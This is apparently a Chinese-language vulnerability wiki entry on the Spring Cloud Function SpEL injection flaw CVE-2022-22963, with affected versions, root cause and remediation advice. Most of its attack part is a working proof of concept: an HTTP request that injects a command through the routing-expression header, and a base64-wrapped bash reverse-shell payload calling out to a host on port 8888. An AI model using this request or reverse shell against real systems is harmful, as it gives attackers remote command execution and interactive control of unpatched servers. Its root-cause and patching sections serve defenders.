# SpringCloudFunctionSpEL RCE(CVE-2022-22963)

## 利用条件：

- 3.0.0.RELEASE <= Spring Cloud Function <= 3.2.2

## 利用方法：

#### POC：
```shell
POST /functionRouter
Host: 1.1.1.1
spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("calc")
Content-Type: application/x-www-form-urlencoded

1
```
- linux反弹shell POC：
`bash -i >&/dev/tcp/1.1.1.1/8888 0>&1`经过base64编码，作为exec("")参数
```shell
bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEuMS4xLjEvODg4OCAwPiYx}|{base64,-d}|{bash,-i}
```
![](https://github.com/user-error-404/WIKI-POC/blob/main/Wiki/开发框架漏洞/Spring/SpringCloudFunctionSpEL%20RCE(CVE-2022-22963)/img/poc.jpg)
![](https://github.com/user-error-404/WIKI-POC/blob/main/Wiki/开发框架漏洞/Spring/SpringCloudFunctionSpEL%20RCE(CVE-2022-22963)/img/nc.jpg)

## 漏洞原理：

1. 在main分支commit dc5128b中，新增了SimpleEvaluationContext,由isViaHeader变量作为flag，在解析前判断spring.cloud.function.routing-expression的值是不是取自HTTP头，如果是的话就用SimpleEvaluationContext解析SpEL语句，不是来自外部输入时（比如System.setProperty）才用StandardEvaluationContext解析
2. 伪造http头请求，造成漏洞利用

## 漏洞修复：

1. 排查pom.xml或应用程序中lib文件夹是否包含对spring-cloud-function组件的引用，使用官方最新发布版本。
2. 更新安全设备防护规则或手动改创建规则防护(检测spring.cloud.function.routing-expression)